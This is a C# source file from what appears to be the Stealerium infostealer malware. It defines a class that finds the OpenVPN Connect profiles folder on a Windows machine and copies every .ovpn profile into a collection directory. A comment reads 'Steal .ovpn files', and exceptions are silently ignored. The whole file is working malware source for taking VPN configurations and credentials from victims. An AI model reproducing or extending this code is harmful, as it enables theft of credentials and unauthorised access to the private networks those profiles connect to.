using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class OpenVpn
    {
        // Save("OpenVPN");
        public static void Save(string sSavePath)
        {
            // "OpenVPN connect" directory path
            var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "OpenVPN Connect\\profiles");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Create directory to save profiles
                Directory.CreateDirectory(sSavePath + "\\profiles");
                // Steal .ovpn files
                foreach (var file in Directory.GetFiles(vpn))
                    if (Path.GetExtension(file).Contains("ovpn"))
                    {
                        Counter.Vpn++;
                        File.Copy(file,
                            Path.Combine(sSavePath, "profiles\\"
                                                    + Path.GetFileName(file)));
                    }
            }
            catch
            {
                // ignored
            }
        }
    }
}